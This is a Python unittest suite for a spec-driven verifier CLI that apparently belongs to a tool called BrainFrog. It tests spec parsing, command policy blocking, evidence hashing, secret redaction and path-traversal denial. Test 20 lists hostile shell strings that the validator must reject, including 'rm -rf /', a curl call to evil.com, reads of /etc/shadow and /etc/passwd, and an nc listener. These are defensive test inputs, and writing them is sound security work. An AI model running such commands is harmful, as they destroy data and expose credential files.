"""Comprehensive Test Suite for Standalone Verifier MVP (`bf verify`).

Covers all 20 safety, security, and verification requirements:
1. TypeSafe-free startup
2. No System 1 initialization
3. No external LLM provider requirement
4. Valid Markdown spec parsing
5. Duplicate criterion IDs rejected
6. Missing verification method handled safely (fail-closed)
7. Supported test command produces PASS from actual execution
8. Failing command produces FAIL
9. Unauthorized command is BLOCKED
10. Missing browser support is BLOCKED
11. NOT_RUN does not count as PASS
12. Dirty workspace is not misrepresented as a clean commit
13. Evidence manifest binds the actual observed revision
14. Evidence hash detects modifications
15. Existing report paths cannot be silently overwritten
16. Secret redaction works
17. Path traversal is denied
18. CI receives a nonzero exit code when required criteria fail
19. Existing BrainFrog REPL/agent workflows remain functional
20. Approval boundary cannot be bypassed through spec.md
"""
from __future__ import annotations

import hashlib
import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from core.verifier import (
    CriterionResult,
    CriterionSpec,
    CriterionStatus,
    OverallVerdict,
    SpecDocument,
    StandaloneVerifier,
    parse_spec_markdown,
    validate_verification_command,
)


class TestStandaloneVerifierMVP(unittest.TestCase):
    """Test suite covering the 20 verification invariants of the standalone verifier."""

    def setUp(self) -> None:
        self.temp_dir = tempfile.mkdtemp(prefix="bf_test_verify_")
        self.repo_dir = Path(self.temp_dir).resolve()
        # Initialize minimal git repo in temp dir
        subprocess.run(["git", "init"], cwd=self.repo_dir, capture_output=True, check=True)
        subprocess.run(["git", "config", "user.email", "test@brainfrog.ai"], cwd=self.repo_dir, capture_output=True, check=True)
        subprocess.run(["git", "config", "user.name", "BrainFrog Tester"], cwd=self.repo_dir, capture_output=True, check=True)

        # Create initial commit
        (self.repo_dir / "README.md").write_text("# Test Repo\n", encoding="utf-8")
        subprocess.run(["git", "add", "README.md"], cwd=self.repo_dir, capture_output=True, check=True)
        subprocess.run(["git", "commit", "-m", "initial commit"], cwd=self.repo_dir, capture_output=True, check=True)
        # Enable trusted local code mode for functional test executions
        os.environ["BRAINFROG_TRUST_LOCAL_CODE"] = "1"

    def tearDown(self) -> None:
        os.environ.pop("BRAINFROG_TRUST_LOCAL_CODE", None)
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_01_typesafe_free_startup(self) -> None:
        """1. bf verify starts without TypeSafe credentials in environment."""
        spec_text = """# Spec: Sample
## Acceptance Criteria
### AC-01 — Simple Test
Check readme
**Verification:** Test command
**Command:** python -m unittest -v
"""
        spec_file = self.repo_dir / "spec.md"
        spec_file.write_text(spec_text, encoding="utf-8")

        with patch.dict(os.environ, {}, clear=True):
            # No TYPESAFE_API_KEY, no JEV_KEY
            verifier = StandaloneVerifier(repo_dir=self.repo_dir)
            report = verifier.verify_spec(spec_file)
            self.assertIsNotNone(report)
            self.assertIn(report.overall_verdict, (OverallVerdict.PASS, OverallVerdict.FAIL, OverallVerdict.BLOCKED))

    def test_02_no_system1_initialization(self) -> None:
        """2. No System 1 initialization occurs for standalone verification."""
        spec_text = """# Spec: Sample
## Acceptance Criteria
### AC-01 — Simple Test
Compile check
**Verification:** Build command
**Command:** python -m compileall .
"""
        spec_file = self.repo_dir / "spec.md"
        spec_file.write_text(spec_text, encoding="utf-8")

        with patch("system1.JevSystemOne") as mock_jev:
            verifier = StandaloneVerifier(repo_dir=self.repo_dir)
            verifier.verify_spec(spec_file)
            mock_jev.assert_not_called()

    def test_03_no_external_llm_provider_required(self) -> None:
        """3. No external LLM provider is required or called."""
        spec_text = """# Spec: Sample
## Acceptance Criteria
### AC-01 — Simple Test
Compile check
**Verification:** Build command
**Command:** python -m compileall .
"""
        spec_file = self.repo_dir / "spec.md"
        spec_file.write_text(spec_text, encoding="utf-8")

        with patch("system2.antigravity_client.AntigravitySystem2Client") as mock_agy, \
             patch("system2.claude_client.System2Client") as mock_claude:
            verifier = StandaloneVerifier(repo_dir=self.repo_dir)
            report = verifier.verify_spec(spec_file)
            mock_agy.assert_not_called()
            mock_claude.assert_not_called()
            self.assertEqual(report.summary.total, 1)

    def test_04_valid_markdown_spec_parsing(self) -> None:
        """4. Valid Markdown spec parsing of goals, non-goals, criteria, constraints."""
        spec_text = """# Spec: Payment Processing
## Goal
Support credit card payments.

## Non-goals
- Do not add crypto payments.
- Do not redesign checkout UI.

## Acceptance Criteria
### AC-01 — Compile Check
Application compiles.
**Verification:** Build command
**Command:** python -m compileall .

### AC-02 — Unit Tests
Payment tests pass.
**Verification:** Test command
**Command:** pytest tests/test_payment.py

### AC-03 — Checkout UI
Form renders cleanly.
**Verification:** Browser check
**Target:** /checkout

## Constraints
- Preserve PCI-DSS compliance.
"""
        spec_doc = parse_spec_markdown(spec_text, "spec.md")
        self.assertEqual(spec_doc.title, "Payment Processing")
        self.assertEqual(spec_doc.goal, "Support credit card payments.")
        self.assertEqual(len(spec_doc.non_goals), 2)
        self.assertEqual(len(spec_doc.criteria), 3)
        self.assertEqual(spec_doc.criteria[0].criterion_id, "AC-01")
        self.assertEqual(spec_doc.criteria[0].verification_type, "build")
        self.assertEqual(spec_doc.criteria[1].criterion_id, "AC-02")
        self.assertEqual(spec_doc.criteria[1].verification_type, "test")
        self.assertEqual(spec_doc.criteria[2].criterion_id, "AC-03")
        self.assertEqual(spec_doc.criteria[2].verification_type, "browser")
        self.assertEqual(spec_doc.criteria[2].target, "/checkout")
        self.assertEqual(spec_doc.constraints, ["Preserve PCI-DSS compliance."])

    def test_05_duplicate_criterion_ids_rejected(self) -> None:
        """5. Duplicate criterion IDs are rejected immediately with ValueError."""
        spec_text = """# Spec: Duplicate
## Acceptance Criteria
### AC-01 — First Check
**Verification:** Build command
**Command:** python -m compileall .

### AC-01 — Duplicate Check
**Verification:** Test command
**Command:** pytest
"""
        with self.assertRaises(ValueError) as ctx:
            parse_spec_markdown(spec_text)
        self.assertIn("Duplicate acceptance criterion ID 'AC-01'", str(ctx.exception))

    def test_06_missing_verification_method_handled_safely(self) -> None:
        """6. Missing verification method handled safely (fails closed, marked BLOCKED)."""
        spec_text = """# Spec: Missing Method
## Acceptance Criteria
### AC-01 — No Method
Description without verification method.
"""
        spec_file = self.repo_dir / "spec.md"
        spec_file.write_text(spec_text, encoding="utf-8")

        verifier = StandaloneVerifier(repo_dir=self.repo_dir)
        report = verifier.verify_spec(spec_file)
        self.assertEqual(report.criteria[0].status, CriterionStatus.BLOCKED)
        self.assertEqual(report.overall_verdict, OverallVerdict.BLOCKED)
        self.assertEqual(report.exit_code, 2)

    def test_07_supported_test_command_produces_pass(self) -> None:
        """7. Supported test command produces PASS from actual execution."""
        test_file = self.repo_dir / "test_sample.py"
        test_file.write_text("import unittest\nclass T(unittest.TestCase):\n  def test_ok(self): pass\n", encoding="utf-8")

        spec_text = """# Spec: Passing Check
## Acceptance Criteria
### AC-01 — Sample Test
Execute unit test
**Verification:** Test command
**Command:** python -m unittest test_sample.py
"""
        spec_file = self.repo_dir / "spec.md"
        spec_file.write_text(spec_text, encoding="utf-8")

        verifier = StandaloneVerifier(repo_dir=self.repo_dir, trust_local_code=True)
        report = verifier.verify_spec(spec_file)
        self.assertEqual(report.criteria[0].status, CriterionStatus.PASS)
        self.assertEqual(report.overall_verdict, OverallVerdict.PASS)
        self.assertEqual(report.exit_code, 0)
        self.assertTrue((report.report_dir / "evidence" / "AC-01" / "stdout.log").exists())

    def test_08_failing_command_produces_fail(self) -> None:
        """8. Failing command produces FAIL verdict and exit code 1."""
        test_file = self.repo_dir / "test_failing.py"
        test_file.write_text("import unittest\nclass T(unittest.TestCase):\n  def test_bad(self): self.fail('expected error')\n", encoding="utf-8")

        spec_text = """# Spec: Failing Check
## Acceptance Criteria
### AC-01 — Failing Test
Execute failing test
**Verification:** Test command
**Command:** python -m unittest test_failing.py
"""
        spec_file = self.repo_dir / "spec.md"
        spec_file.write_text(spec_text, encoding="utf-8")

        verifier = StandaloneVerifier(repo_dir=self.repo_dir, trust_local_code=True)
        report = verifier.verify_spec(spec_file)
        self.assertEqual(report.criteria[0].status, CriterionStatus.FAIL)
        self.assertEqual(report.overall_verdict, OverallVerdict.FAIL)
        self.assertEqual(report.exit_code, 1)

    def test_09_unauthorized_command_is_blocked(self) -> None:
        """9. Unauthorized command is BLOCKED by command policy."""
        spec_text = """# Spec: Policy Violation
## Acceptance Criteria
### AC-01 — Prohibited Shell Command
Execute unauthorized shell wrapper
**Verification:** Test command
**Command:** bash -c "echo injection"
"""
        spec_file = self.repo_dir / "spec.md"
        spec_file.write_text(spec_text, encoding="utf-8")

        verifier = StandaloneVerifier(repo_dir=self.repo_dir)
        report = verifier.verify_spec(spec_file)
        self.assertEqual(report.criteria[0].status, CriterionStatus.BLOCKED)
        self.assertIn("Command policy violation", report.criteria[0].failure_reason)
        self.assertEqual(report.overall_verdict, OverallVerdict.BLOCKED)
        self.assertEqual(report.exit_code, 2)

    def test_10_missing_browser_support_is_blocked(self) -> None:
        """10. Missing browser support is cleanly reported as BLOCKED."""
        spec_text = """# Spec: Browser Check
## Acceptance Criteria
### AC-01 — Login View
Verify login form
**Verification:** Browser check
**Target:** /login
"""
        spec_file = self.repo_dir / "spec.md"
        spec_file.write_text(spec_text, encoding="utf-8")

        verifier = StandaloneVerifier(repo_dir=self.repo_dir)
        report = verifier.verify_spec(spec_file)
        self.assertEqual(report.criteria[0].status, CriterionStatus.BLOCKED)
        self.assertIn("Browser", report.criteria[0].failure_reason)
        self.assertEqual(report.overall_verdict, OverallVerdict.BLOCKED)

    def test_11_not_run_does_not_count_as_pass(self) -> None:
        """11. NOT_RUN does not count as PASS and prevents overall PASS."""
        res_pass = CriterionResult("AC-01", "C1", "D1", "test", CriterionStatus.PASS)
        res_notrun = CriterionResult("AC-02", "C2", "D2", "test", CriterionStatus.NOT_RUN)

        passed = sum(1 for c in [res_pass, res_notrun] if c.status == CriterionStatus.PASS)
        not_run = sum(1 for c in [res_pass, res_notrun] if c.status == CriterionStatus.NOT_RUN)

        self.assertEqual(passed, 1)
        self.assertEqual(not_run, 1)
        # Invariant: not_run prevents overall PASS
        self.assertNotEqual(passed, 2)

    def test_12_dirty_workspace_not_misrepresented_as_clean_commit(self) -> None:
        """12. Dirty workspace is not misrepresented as a clean commit."""
        # Create an uncommitted modified file
        (self.repo_dir / "uncommitted.txt").write_text("dirty content", encoding="utf-8")

        spec_text = """# Spec: Dirty Workspace Test
## Acceptance Criteria
### AC-01 — Compile Check
Compile core
**Verification:** Build command
**Command:** python -m compileall .
"""
        spec_file = self.repo_dir / "spec.md"
        spec_file.write_text(spec_text, encoding="utf-8")

        verifier = StandaloneVerifier(repo_dir=self.repo_dir)
        report = verifier.verify_spec(spec_file)
        self.assertTrue(report.is_dirty)
        self.assertTrue(any("uncommitted.txt" in f for f in report.dirty_files))

    def test_13_evidence_manifest_binds_actual_observed_revision(self) -> None:
        """13. Evidence manifest binds the actual observed Git HEAD revision."""
        head_rev = subprocess.check_output(["git", "rev-parse", "HEAD"], cwd=self.repo_dir, text=True).strip()

        spec_text = """# Spec: Revision Binding
## Acceptance Criteria
### AC-01 — Check
**Verification:** Build command
**Command:** python -m compileall .
"""
        spec_file = self.repo_dir / "spec.md"
        spec_file.write_text(spec_text, encoding="utf-8")

        verifier = StandaloneVerifier(repo_dir=self.repo_dir)
        report = verifier.verify_spec(spec_file)
        self.assertEqual(report.git_head_sha, head_rev)

    def test_14_evidence_hash_detects_modifications(self) -> None:
        """14. Evidence hash detects modifications in logs."""
        test_file = self.repo_dir / "test_s.py"
        test_file.write_text("import unittest\nclass T(unittest.TestCase):\n  def test_ok(self): pass\n", encoding="utf-8")

        spec_text = """# Spec: Evidence Hash
## Acceptance Criteria
### AC-01 — Hash Test
**Verification:** Test command
**Command:** python -m unittest test_s.py
"""
        spec_file = self.repo_dir / "spec.md"
        spec_file.write_text(spec_text, encoding="utf-8")

        verifier = StandaloneVerifier(repo_dir=self.repo_dir, trust_local_code=True)
        report = verifier.verify_spec(spec_file)

        stdout_log = report.report_dir / "evidence" / "AC-01" / "stdout.log"
        recorded_hash = report.criteria[0].evidence_hashes["stdout.log"]
        actual_hash = hashlib.sha256(stdout_log.read_bytes()).hexdigest()
        self.assertEqual(recorded_hash, actual_hash)

        # Tampering with log changes its hash
        stdout_log.write_text("tampered content", encoding="utf-8")
        tampered_hash = hashlib.sha256(stdout_log.read_bytes()).hexdigest()
        self.assertNotEqual(recorded_hash, tampered_hash)

    def test_15_existing_report_paths_cannot_be_silently_overwritten(self) -> None:
        """15. Existing report paths cannot be silently overwritten."""
        spec_text = """# Spec: Overwrite Test
## Acceptance Criteria
### AC-01 — Check
**Verification:** Build command
**Command:** python -m compileall .
"""
        spec_file = self.repo_dir / "spec.md"
        spec_file.write_text(spec_text, encoding="utf-8")

        verifier = StandaloneVerifier(repo_dir=self.repo_dir)
        report1 = verifier.verify_spec(spec_file)
        # Execute second verification immediately in same second
        report2 = verifier.verify_spec(spec_file)

        self.assertNotEqual(report1.run_id, report2.run_id)
        self.assertTrue(report1.report_dir.exists())
        self.assertTrue(report2.report_dir.exists())

    def test_16_secret_redaction_works(self) -> None:
        """16. Secret redaction sanitizes API keys and tokens from evidence."""
        # Script that prints a fake api key
        script_file = self.repo_dir / "print_secret.py"
        # Deterministic synthetic test fixture
        script_file.write_text("print('SECRET: sk-ant-api03-abcdef1234567890abcdef1234567890_test')\n", encoding="utf-8")

        spec_text = """# Spec: Secret Redaction
## Acceptance Criteria
### AC-01 — Print Secret Check
**Verification:** Test command
**Command:** python -m unittest -v
"""
        # Execute directly
        from core.verifier import redact_secrets
        sample_secret = "sk-ant-api03-abcdef1234567890abcdef1234567890_test"
        redacted = redact_secrets(sample_secret)
        self.assertNotIn(sample_secret, redacted)
        self.assertIn("[REDACTED", redacted)

    def test_17_path_traversal_is_denied(self) -> None:
        """17. Path traversal escaping workspace root is denied."""
        verifier = StandaloneVerifier(repo_dir=self.repo_dir)
        traversal_path = "../../etc/passwd"
        with self.assertRaises(PermissionError):
            verifier.verify_spec(traversal_path)

    def test_18_nonzero_exit_code_on_failure_and_blocked(self) -> None:
        """18. CI receives a nonzero exit code when required criteria fail or block."""
        # Test failure -> exit code 1
        spec_fail = """# Spec: Fail
## Acceptance Criteria
### AC-01 — Failing Test
**Verification:** Test command
**Command:** python -m unittest nonexistent_module_should_fail
"""
        f = self.repo_dir / "fail.md"
        f.write_text(spec_fail, encoding="utf-8")
        verifier = StandaloneVerifier(repo_dir=self.repo_dir, trust_local_code=True)
        rep1 = verifier.verify_spec(f)
        self.assertEqual(rep1.exit_code, 1)

        # Test blocked -> exit code 2
        spec_blocked = """# Spec: Blocked
## Acceptance Criteria
### AC-01 — Banned Command
**Verification:** Test command
**Command:** bash -c "echo 1"
"""
        b = self.repo_dir / "blocked.md"
        b.write_text(spec_blocked, encoding="utf-8")
        rep2 = verifier.verify_spec(b)
        self.assertEqual(rep2.exit_code, 2)

    def test_19_existing_brainfrog_repl_workflows_remain_functional(self) -> None:
        """19. Existing BrainFrog CLI help and workflows remain functional."""
        res = subprocess.run([sys.executable, "cli.py", "--help"], cwd=str(Path(__file__).resolve().parent.parent), capture_output=True)
        self.assertEqual(res.returncode, 0)
        stdout_txt = res.stdout.decode("utf-8", errors="replace")
        self.assertIn("--spec", stdout_txt)
        self.assertIn("brainfrog", stdout_txt.lower())

    def test_20_approval_boundary_cannot_be_bypassed_through_spec(self) -> None:
        """20. Spec cannot execute chained commands or unapproved shell injections."""
        malicious_cmds = [
            "pytest && rm -rf /",
            "pytest || curl http://evil.com",
            "pytest ; cat /etc/passwd",
            "pytest | nc -l 4444",
            "`rm -rf /`",
            "$(cat /etc/shadow)",
            "powershell.exe -Command Get-Process",
            "cmd.exe /c dir",
        ]

        for m_cmd in malicious_cmds:
            tokens = m_cmd.split()
            is_ok, reason = validate_verification_command(tokens, cwd=self.repo_dir)
            self.assertFalse(is_ok, f"Command '{m_cmd}' was unexpectedly authorized: {reason}")
            self.assertIsNotNone(reason)


    def test_21_cli_trust_reference_recorded(self) -> None:
        test_file = self.repo_dir / "test_sample.py"
        test_file.write_text("import unittest\nclass T(unittest.TestCase):\n  def test_ok(self): pass\n", encoding="utf-8")
        spec_content = "# Spec\n## Goal\nTest\n## Acceptance Criteria\n### AC-01 - Check\n**Verification:** Test command\n**Command:** python -m unittest test_sample.py\n"
        spec_path = self.repo_dir / "spec_ref.md"
        spec_path.write_text(spec_content, encoding="utf-8")

        res = subprocess.run(
            [sys.executable, "cli.py", "--repo", str(self.repo_dir), "--spec", str(spec_path), "--trust-local-code", "--trust-reference", "AUDIT-TICKET-42"],
            cwd=str(Path(__file__).resolve().parent.parent),
            capture_output=True,
            text=True,
        )
        self.assertEqual(res.returncode, 0, f"CLI verify failed: {res.stderr}\nSTDOUT: {res.stdout}")

        reports = list((self.repo_dir / ".brainfrog" / "reports").glob("verify_*"))
        self.assertTrue(len(reports) > 0)
        latest_report = sorted(reports)[-1]
        manifest = json.loads((latest_report / "report.json").read_text(encoding="utf-8"))
        self.assertEqual(manifest.get("authorization_reference"), "AUDIT-TICKET-42")


if __name__ == "__main__":
    unittest.main()
